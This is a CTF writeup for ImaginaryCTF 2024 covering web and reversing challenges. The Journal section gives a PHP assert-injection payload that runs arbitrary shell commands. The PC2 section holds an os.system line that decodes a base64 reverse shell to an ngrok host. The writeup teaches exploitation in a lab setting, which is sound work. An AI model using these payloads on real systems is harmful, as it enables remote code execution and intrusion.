<h3> Imaginary CTF 2024 </h3>

![image](https://github.com/user-attachments/assets/39f0b7e9-9548-427f-9e9a-653f6514afd6)

Hello guys, I'm `0x1337` and last night I participated in ImaginaryCTF 

Even though I started really late i'm happy to have least solved some challenges

And in this writeup I'll go through the challenges which I solved

### Web
- Readme
- Journal
- PC2
- Crystals

### Reversing
- Unoriginal
- Rust
- Absolute Flag Checker
- Watchdog

### Pwn
- Imgstore
- Ropity
- Onewrite


---
---

### Web

#### Readme
![image](https://github.com/user-attachments/assets/83893b67-ce4e-4b9f-94f5-d449f57b339b)

We are given the web instance and a file sharing server which has a compressed archive
![image](https://github.com/user-attachments/assets/f3a804c0-ee26-4ce4-8081-22a17d73342f)

After downloading it I uncompressed it and got this
![image](https://github.com/user-attachments/assets/f3c6e762-d328-414c-af87-d3e05ed34d7f)

So that's the application source code

Opening it in VSCode I saw the flag in the `Dockerfile` 
![image](https://github.com/user-attachments/assets/d980e458-4cfa-4eb3-9ad7-a5f8a71465fc)

It seems this was unintended which lead to the release of `Readme2` i presume

In any case I got the flag

```
Flag: ictf{path_normalization_to_the_rescue}
```

#### Journal
![image](https://github.com/user-attachments/assets/af6b8d8f-f7a3-4b35-96a5-ec9aba56ef8b)

After downloading the zip file from the file sharing server I uncompressed it which gave the source code
![image](https://github.com/user-attachments/assets/8765564e-ae62-48cb-bc62-34548ada272d)

You can ignore the `test.php` as it wasn't there initially (i created it for debugging0

Let's check out the source code but before that it's good practice to check the `Dockerfile`
![image](https://github.com/user-attachments/assets/92d25f25-1bbd-4e93-9b2c-f6b7f20ceff2)

Basically this Dockerfile would install `php:7-apache` then do some web server configuration

And what i mean by that is this:
- Setups the web server files
- Starts Apache HTTP Server in the foreground while setting specific environment variables and user/group permissions. 
- Randomize the flag file name

Ok at this point we know that the `flag.txt` file would be of a random name stored in `/`

That means we might need to get `RCE` to get the name and it's content

Moving on we can check the application source code which is `index.php`
![image](https://github.com/user-attachments/assets/fc9faa9d-7a84-4ec8-bf1b-16afea34e301)

```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");
// 
  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";

?>
```

The code isn't much and basically it would include any file passed to the `file` parameter considering it's valid

So this is an `LFI` sort of challenge!

But the issue here is that before it includes our file it would check for the occurrence of `..` in our input, and that's to prevent us from doing directory transversal

The odd thing here is that it uses `assert` for the check

And one issue about `assert` is that it basically does an `eval()` based on the string passed into it

Ok good we can leverage this to get `RCE` 

In order to do that we need to first escape the `strpos` call and here's how I did that

```
rce' and die(system(ls)) or '
```

I got that payload from [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)

Doing that works and I got the current files in that directory
![image](https://github.com/user-attachments/assets/660f400d-32f5-4639-96b9-935b1adbc568)

To get full command execution I used this:
![image](https://github.com/user-attachments/assets/3cb78497-2753-4913-8f84-d757cff22e90)

```
rce' and die(system($_GET['cmd'])) or '&cmd=ls -al
```

Now we can get the flag file name
![image](https://github.com/user-attachments/assets/bcee56f8-008f-43b9-8837-4276c3e6df12)

And then we concatenate it :)
![image](https://github.com/user-attachments/assets/7fe8a59b-4b3a-49e5-988a-fbff042a9095)

```
http://journal.chal.imaginaryctf.org/?file=rce' and die(system($_GET['cmd'])) or '&cmd=cat /flag-cARdaInFg6dD10uWQQgm.txt
```

Cool we got the flag

```
Flag: ictf{assertion_failed_e3106922feb13b10}
```

#### PC2
![image](https://github.com/user-attachments/assets/116d8819-66d3-4211-b047-99acfddfbd56)

As usual we are given the source which we i already downloaded
![image](https://github.com/user-attachments/assets/ef8b62d3-4651-4f3f-90f3-471919416169)

It's a python web application so let's start by checking the `Dockerfile`
![image](https://github.com/user-attachments/assets/99e031fe-aed3-4208-a51a-803d268eb263)

Nothing much here just some setups

Ok so let's check the app source code
![image](https://github.com/user-attachments/assets/839ad87b-4d76-4d88-b7e0-bde4779becc2)
![image](https://github.com/user-attachments/assets/79ae8be4-ba76-424b-95c9-3e981babeaea)

The only available route is `/` and what it does is this:
- Retrieves the `code` body parameter if the http request method is `POST`
- Calls function `xec()` passing the data body as the argument
- Does some regular expression check and if the pattern check doesn't return `None` it would render the `index.html` template

So far nothing interesting here

Let's check the `xec` function
- It would indent the parameter passed into the function
- Generates a random file name based on the `md5` hash of the code content
- Does some python templating inroder to make it a valid python code
- Makes it executable
- And finally runs the python code

The thing of interest here is that it would use our input value and add it to a template which would be stored as a python code then executed

I copied the `xec` function to know how the final python code would be based on our input and saw this
![image](https://github.com/user-attachments/assets/9623c760-0620-486a-a831-730c8570cd56)

This is how the final code would be:

```python
def main():
    print('hi')

from parse import rgb_parse
print(rgb_parse(main())
```

We can decide to check the `parse.rgp_parse` function but that's not needed because `main()` would be called first and it's the value returned from it that's going to be used in the function

In order words because we have control over what will be executed we can inject our malicious code and it would get executed

Cool!

I decided to just get a reverse shell

First I setup ngrok then base64 encode my reverse shell
![image](https://github.com/user-attachments/assets/75358e96-3dee-42be-bf75-03dfdec28d15)

Now i just need to use the `os` module then access the `system` function to execute shell command

Here's my payload
![image](https://github.com/user-attachments/assets/80c98104-f180-4e15-b47f-dc97006bce31)

```python
import os
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80LnRjcC51cy1jYWwtMS5uZ3Jvay5pby8xNTkxNCAwPiYx | base64 -d | bash')
```

Back to my netcat listener I got a reverse shell
![image](https://github.com/user-attachments/assets/39fcafbb-b047-49be-b1e6-7df4d7af405d)

```
Flag: ictf{d1_color_picker_fr_2ce0dd3d}
```

#### Crystals
![image](https://github.com/user-attachments/assets/673cd703-5455-4266-bc05-3a40e2cbd45e)

After downloading the source code I checked it out

The `Dockerfile` shows it's running a ruby web server
![image](https://github.com/user-attachments/assets/3becf51e-06fc-41d6-a720-c93cfb64a9e2)

The docker compose file shows the flag is stored as the `hostname`
![image](https://github.com/user-attachments/assets/cfb438b8-1278-43f6-b519-44a7781e7d63)

The main application source code shows only one route available which is `/` and what it does is just to include the `index.erb` file
![image](https://github.com/user-attachments/assets/ca88b02e-2469-4873-b5c4-0aa764c72f94)

Ok what exactly do we do?

Since the flag is stored as the `hostname` I tried to leak it by causing an error

And to achieve that I sent an invalid request

To do that I used `curl` because using my web browser ended up urlencoding the path i tried accessing
![image](https://github.com/user-attachments/assets/c1c690ff-0815-4ead-808c-ed6d142e1785)

```
curl 'http://crystals.chal.imaginaryctf.org/`'
```

And with that I got the flag

```
Flag: ictf{seems_like_you_broke_it_pretty_bad_76a87694}
```

---
---

### Reversing

#### Unoriginal
![image](https://github.com/user-attachments/assets/d3758826-a91d-4f4c-8393-29d3c520740d)

I downloaded the executable and checked what type of file it is
![image](https://github.com/user-attachments/assets/2899bd68-c53a-45d0-a846-e46a8469ee95)

Ok a x64 binary which is not stripped

I ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/40fccd39-a8e2-446d-ac8e-890ad98e5185)

It requires us to give it the right flag

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/45f46868-70a8-49bc-bfd2-a612ea87bf12)

So reading through the disassembly we see that it would:
- Print out the msg
- Receive our input which is stored in `rbp+s1`
- Initializes a counter variable `rbp+var_44` to `0`
- It then jumps to `loc_122E` which checks if the counter is equal to `0x2f`
- If that counter is less than the expected value it jumps to `loc_1212`
- And what that does is basically performing a xor operation on the input value at the counter index with 5
- But if the length comparism doesn't return True with will then compare the our encrypted value against a hardcoded one
  - If this `strcmp` call returns `True` that means we got the flag else that's the wrong flag
 

At this point it's clear that the encryption logic is basically using xor with key of 5 against our input and then comparing it against a hardcoded encrypted flag

To reverse it we just need to xor the encrypted flag with 5

I used cyberchef to do that
![image](https://github.com/user-attachments/assets/a3d589b4-52d4-40e3-83bd-83fd27740c4b)

```
Flag: ictf{just_another_flag_checker_a3465d5e5ee234ba}
```

#### Rust
![image](https://github.com/user-attachments/assets/eac743f7-2471-4b3b-8d1e-0c79774595c8)

After downloading attached file I saw it was a binary and an output file

Checking the file type of the executable shows this
![image](https://github.com/user-attachments/assets/9a09749c-92c3-4a99-b452-6147d4c4bcf2)

So we are working with a 64bits binary which is dynamically linked and not stripped

And good enough we have debug_info enabled which means there would debug symbols

The other file attached is output.txt, which contains the output from when the author ran the program against the flag

Let's also run it to get an overview of what it does
![image](https://github.com/user-attachments/assets/5361b299-5fde-452b-938a-62b484ed6561)

Ok good at this point we know that the encryption algorithm always would return the same value if the key is the same

Time to reverse it

Using Ghidra I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/338fda27-fd26-46a1-bb48-d47dfe0928d9)

Because `debug_info` is enabled, it makes life much easier for me since I'm not familiar with rust internals or the Rust programming language. This way, I won't end up trying to reverse-engineer an internal implementation 😅

Ok let's continue

```c
void main(int param_1,u8 **param_2)

{
  std::rt::lang_start<()>(rust::rust::main,(long)param_1,param_2,0);
  return;
}
```

So it calls `rust::rust::main` and here's the decompilation
![image](https://github.com/user-attachments/assets/f9650417-f2cb-4301-9a53-1cdc9f1676a1)

Basically it would print out the text, receive the msg and the key then call the `encrypt` function

```c
encrypt((char *)local_50._8_8_,stack0xffffffffffffffb8.length);
```

We can assume that the `encrypt` function would require the `msg & key` as the parameter but to confirm I set a breakpoint at the `call` to this function
![image](https://github.com/user-attachments/assets/2e26eca8-7b9d-4af7-85d1-2a56e0980fd0)
![image](https://github.com/user-attachments/assets/5eafaf61-08a8-4c8d-83a0-623ab4031b88)

Ok good our assumption was almost right but this correct calling convention is this:

```c
encrypt(char *msg, int msg_length, int key);
```

The reason why Ghidra didn't get that right is because the data type wasn't set correctly, if I'm not mistaken

Moving on, let us check out the encrypt function decompilation
![image](https://github.com/user-attachments/assets/bb044728-318d-4b29-9f59-fe5bd3d628f6)

Wait wtf the parameters to this function is just 2?

```c
rust::rust::encrypt(char *message,int key)
```

And from the debug symbol it shows the right way it's called

```rust
void encrypt(&str message, u128 key)
```

Oh well, let's continue

![image](https://github.com/user-attachments/assets/1848087f-c314-48a8-bf6a-93d3c4e23620)

I put the `encrypt` function decompilation [here](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Rust/encrypt.c)

So what does this do?

The main part where it does the encryption is here:

```c
    local_80 = (ulong)extraout_DL << 5;
    local_70 = local_80 >> 3;
    local_68 = 0;
    local_60 = in_RDX ^ local_70;
    uVar3 = local_60 + 0x539;
    uVar2 = in_RCX + (0xfffffffffffffac6 < local_60);
    if (SCARRY8(in_RCX,0) != SCARRY8(in_RCX,(ulong)(0xfffffffffffffac6 < local_60))) break;
    local_40 = ~uVar3;
    local_38 = ~uVar2;
```

And I had to read the disassembly from `rust::encrypt`

```c
   0x000055555555e3a8 <+600>:   mov    rcx,QWORD PTR [rsp+0x58]
   0x000055555555e3ad <+605>:   mov    rax,QWORD PTR [rsp+0x60]
   0x000055555555e3b2 <+610>:   shld   rax,rcx,0x5
   0x000055555555e3b7 <+615>:   mov    QWORD PTR [rsp+0x38],rax
   0x000055555555e3bc <+620>:   shl    rcx,0x5
   0x000055555555e3c0 <+624>:   mov    QWORD PTR [rsp+0x40],rcx
   0x000055555555e3c5 <+629>:   mov    QWORD PTR [rsp+0x178],rcx
   0x000055555555e3cd <+637>:   mov    QWORD PTR [rsp+0x180],rax
   0x000055555555e3d5 <+645>:   mov    rcx,QWORD PTR [rsp+0x90]
   0x000055555555e3dd <+653>:   mov    rdx,QWORD PTR [rsp+0x98]
   0x000055555555e3e5 <+661>:   mov    rax,QWORD PTR [rsp+0x38]
   0x000055555555e3ea <+666>:   mov    rdi,QWORD PTR [rsp+0x40]
   0x000055555555e3ef <+671>:   mov    rsi,rax
   0x000055555555e3f2 <+674>:   shld   rsi,rdi,0x3d
   0x000055555555e3f7 <+679>:   sar    rax,0x3
   0x000055555555e3fb <+683>:   mov    QWORD PTR [rsp+0x190],rax
   0x000055555555e403 <+691>:   mov    QWORD PTR [rsp+0x188],rsi
   0x000055555555e40b <+699>:   xor    rdx,rsi
   0x000055555555e40e <+702>:   xor    rcx,rax
   0x000055555555e411 <+705>:   mov    QWORD PTR [rsp+0x1a0],rcx
   0x000055555555e419 <+713>:   mov    QWORD PTR [rsp+0x198],rdx
   0x000055555555e421 <+721>:   add    rdx,0x539
   0x000055555555e428 <+728>:   mov    QWORD PTR [rsp+0x28],rdx
   0x000055555555e42d <+733>:   adc    rcx,0x0
   0x000055555555e431 <+737>:   seto   al
   0x000055555555e434 <+740>:   mov    QWORD PTR [rsp+0x30],rcx
   0x000055555555e439 <+745>:   test   al,0x1
   0x000055555555e43b <+747>:   jne    0x55555555e4a0 <_ZN4rust7encrypt17h4f52d2bd6ffc7936E+848>
   0x000055555555e43d <+749>:   mov    rcx,QWORD PTR [rsp+0x90]
   0x000055555555e445 <+757>:   mov    rdx,QWORD PTR [rsp+0x98]
   0x000055555555e44d <+765>:   mov    rsi,QWORD PTR [rsp+0x30]
   0x000055555555e452 <+770>:   mov    rax,QWORD PTR [rsp+0x28]
   0x000055555555e457 <+775>:   mov    QWORD PTR [rsp+0x1a8],rax
   0x000055555555e45f <+783>:   mov    QWORD PTR [rsp+0x1b0],rsi
   0x000055555555e467 <+791>:   not    rax
   0x000055555555e46a <+794>:   mov    QWORD PTR [rsp+0x8],rax
   0x000055555555e46f <+799>:   not    rsi
   0x000055555555e472 <+802>:   mov    QWORD PTR [rsp+0x10],rsi
   0x000055555555e477 <+807>:   mov    QWORD PTR [rsp+0x1c0],rsi
   0x000055555555e47f <+815>:   mov    QWORD PTR [rsp+0x1b8],rax
   0x000055555555e487 <+823>:   add    rdx,rdx
   0x000055555555e48a <+826>:   mov    QWORD PTR [rsp+0x18],rdx
   0x000055555555e48f <+831>:   adc    rcx,rcx
   0x000055555555e492 <+834>:   setb   al
   0x000055555555e495 <+837>:   mov    QWORD PTR [rsp+0x20],rcx
   0x000055555555e49a <+842>:   test   al,0x1
```

Then after understanding it, I wrote the python equivalent which is this:

```python
def encrypt(msg, msg_len, key):
    enc = []
    for i in range(msg_len):
        current_value = ord(msg[i])
        shift_left = current_value << 5
        mangle = ((shift_left << 0x3d) >> 56) >> 8
        var1 = ~((mangle ^ key) + 0x539)

        enc.append(var1)
    
    print(enc)
```

I tested my encryption function and it turned out right

So now how do we go about reversing that?

One thing we need to know is that it uses the provided `key` as the `xor` key

So let's start the reverse option

Moving backwards we need to recover `mangle ^ key` and we can do that by doing this:

```
~(enc) - 0x539
```

Now to recover `mangle` we need the xor key but in this case we don't know the xor key used to encrypt the flag

But because of the symmetric property of XOR we can recover the `key` using this:

```
(~(enc) - 0x539) ^ ord(known_pt[0])
```

Since we know the flag starts with `ictf` we can basically use the first character to recover the key

But I noticed even though that partiallly worked it didn't really give the correct key

In my case when testing I noticed that the last 4 digits are not right

That isn't a problem because we can just brute force it

Moving on, we assume we have the right key so now we need to recover `mangle`

```
(~(enc) - 0x539) ^ key
```

Ok good so now we recover `shift_left`

```
demangle = ((((~(enc) - 0x539) ^ key) << 8) << 56) >> 0x3d
```

And finally we recover the original value

```
flag_char = ((((((~(enc) - 0x539) ^ key) << 8) << 56) >> 0x3d) >> 5) & 0xff
```

With that I wrote a script to get the flag:

```python
def reverse(enc):
    key_ = ((~(enc[0]) - 0x539) ^ ord('i')) >> 16
   
    for key in range(key_, key_+9999):
        pt = ""
        for i in range(len(enc)):
            v1 = (~(enc[i]) - 0x539) ^ key
            demangle = ((v1 << 8) << 56) >> 0x3d
            pt += chr((demangle >> 5) & 0xff)

        if "ictf" in pt:
            print(pt)
            break


def main():
    enc = [-42148619422891531582255418903, -42148619422891531582255418927, -42148619422891531582255418851, -42148619422891531582255418907, -42148619422891531582255418831, -42148619422891531582255418859, -42148619422891531582255418855, -42148619422891531582255419111, -42148619422891531582255419103, -42148619422891531582255418687, -42148619422891531582255418859, -42148619422891531582255419119, -42148619422891531582255418843, -42148619422891531582255418687, -42148619422891531582255419103, -42148619422891531582255418907, -42148619422891531582255419107, -42148619422891531582255418915, -42148619422891531582255419119, -42148619422891531582255418935, -42148619422891531582255418823]

    reverse(enc)
    

if __name__ == '__main__':
    main()
```

Running it gives the flag
![image](https://github.com/user-attachments/assets/4baf7718-f850-4d77-b382-6a006cfab751)

```
Flag: ictf{ru57_r3v_7f4d3a}
```

#### Unconditional
![image](https://github.com/user-attachments/assets/2f059929-1c50-4f4f-93f8-50a644ae9b9d)

After downloading the binary I checked the file type
![image](https://github.com/user-attachments/assets/a351c1dd-e692-4cd5-b44f-2efc0dcee1cc)

We are working with a x64 binary which is not stripped and dynamically linked

I ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/f984f308-46e4-4785-a4bf-ed19bace0cfd)

Weird it just prints out some hex values

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/dadfc162-ffb1-4fff-822e-487f4bac68b7)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  int v33; // eax
  int v34; // eax

  v3 = iterate(0);
  v4 = iterate(v3);
  v5 = iterate(v4);
  v6 = iterate(v5);
  v7 = iterate(v6);
  v8 = iterate(v7);
  v9 = iterate(v8);
  v10 = iterate(v9);
  v11 = iterate(v10);
  v12 = iterate(v11);
  v13 = iterate(v12);
  v14 = iterate(v13);
  v15 = iterate(v14);
  v16 = iterate(v15);
  v17 = iterate(v16);
  v18 = iterate(v17);
  v19 = iterate(v18);
  v20 = iterate(v19);
  v21 = iterate(v20);
  v22 = iterate(v21);
  v23 = iterate(v22);
  v24 = iterate(v23);
  v25 = iterate(v24);
  v26 = iterate(v25);
  v27 = iterate(v26);
  v28 = iterate(v27);
  v29 = iterate(v28);
  v30 = iterate(v29);
  v31 = iterate(v30);
  v32 = iterate(v31);
  v33 = iterate(v32);
  v34 = iterate(v33);
  iterate(v34);
  return 0;
}
```

Ok so we see that it basically calls the `iterate` function with `0` and the result returned from that function is used as the next parameter to the `iterate` function

That is about done 32 times

So this means the main logic is going to be the `iterate` function

Here's the decompilation
![image](https://github.com/user-attachments/assets/200de59f-a073-4aef-a864-d0656167c29a)

```c
__int64 __fastcall iterate(int a1)
{
  bool v1; // al
  unsigned __int8 v3; // [rsp+19h] [rbp-7h]
  bool v4; // [rsp+1Eh] [rbp-2h]

  v3 = flag[a1];
  v4 = (a1 & 1) != 0;
  v1 = v3 > 0x60u && v3 <= 0x7Au;
  flag[a1] = (((v3 >> table2[iterate(int)::counter2]) | (v3 << (8 - table2[iterate(int)::counter2]))) * v1
            + !v1 * (((v3 << 6) | (v3 >> 2)) ^ table1[iterate(int)::counter1]))
           * ((a1 & 1) == 0)
           + ((v3 ^ table1[iterate(int)::counter1]) * v1 + !v1 * ((4 * v3) | (v3 >> 6))) * ((a1 & 1) != 0);
  iterate(int)::counter1 = (v4 + iterate(int)::counter1) % 6;
  iterate(int)::counter2 = (v4 + iterate(int)::counter2) % 6;
  printf("%02x,", flag[a1]);
  return (a1 + 1);
}
```

So this function returns the next index, so it's just a loop

I translated this function to it's python representation 

```python
def iterate(i):
    nonlocal counter1, counter2, final_str
    char = flag[i]
    v4 = (i & 1) != 0
    v1 = 0x60 < char <= 0x7A
    if (i & 1) == 0:
        if v1:
            rotated = (char >> table2[counter2]) | (char << (8 - table2[counter2]))
            flag[i] = rotated & 0xFF 
        else:
            rotated = ((char << 6) | (char >> 2)) ^ table1[counter1]
            flag[i] = rotated & 0xFF 
    else:
        if v1:
            flag[i] = (char ^ table1[counter1]) & 0xFF  
        else:
            flag[i] = ((4 * char) | (char >> 6)) & 0xFF 
    counter1 = (v4 + counter1) % 6
    counter2 = (v4 + counter2) % 6
    return i + 1
```

And after some test I figured that this algorithm is basically deterministic which means that the characters are modified independently of each other

With that I wrote a brute force script which just tries all printable characters and check if it equals the modified flag

Here's my [solve]()

```python
import string

table1 = [0x52, 0x64, 0x71, 0x51, 0x54, 0x76]
table2 = [1, 3, 4, 2, 6, 5]

target = [0xb4, 0x31, 0x8e, 0x02, 0xaf, 0x1c, 0x5d, 0x23, 0x98, 0x7d, 0xa3, 0x1e, 0xb0, 0x3c, 0xb3, 0xc4,
          0xa6, 0x06, 0x58, 0x28, 0x19, 0x7d, 0xa3, 0xc0, 0x85, 0x31, 0x68, 0x0a, 0xbc, 0x03, 0x5d, 0x3d, 0x0b]

def solve(flag):
    flag = [i for i in flag]

    counter1 = 0
    counter2 = 0

    final_str = []

    def iterate(i):
        nonlocal counter1, counter2, final_str
        char = flag[i]
        v4 = (i & 1) != 0
        v1 = 0x60 < char <= 0x7A
        if (i & 1) == 0:
            if v1:
                rotated = (char >> table2[counter2]) | (char << (8 - table2[counter2]))
                flag[i] = rotated & 0xFF 
            else:
                rotated = ((char << 6) | (char >> 2)) ^ table1[counter1]
                flag[i] = rotated & 0xFF 
        else:
            if v1:
                flag[i] = (char ^ table1[counter1]) & 0xFF  
            else:
                flag[i] = ((4 * char) | (char >> 6)) & 0xFF 
        counter1 = (v4 + counter1) % 6
        counter2 = (v4 + counter2) % 6
        return i + 1

    i = 0
    while i < len(flag):
        i = iterate(i)
    return flag


flag = [0 for i in target]
all_chars = [[] for i in target]
charset = string.digits + string.ascii_letters + string.punctuation

for i in range(len(target)):
    for c in charset:
        flag[i] = ord(c)
        res = solve(flag)
        if res[i] == target[i]:
            all_chars[i].append(c)
    if len(all_chars[i]) == 0:
        if i == 4:
            flag[i] = ord('{')
        continue
    flag[i] = ord(all_chars[i][0])
    print(''.join(chr(c) for c in flag))

m = max([len(i) for i in all_chars])

for r in range(m):
    for i in range(len(all_chars)):
        if r < len(all_chars[i]):
            print(all_chars[i][r], end='')
        else:
            print('', end='')
    print()
```
























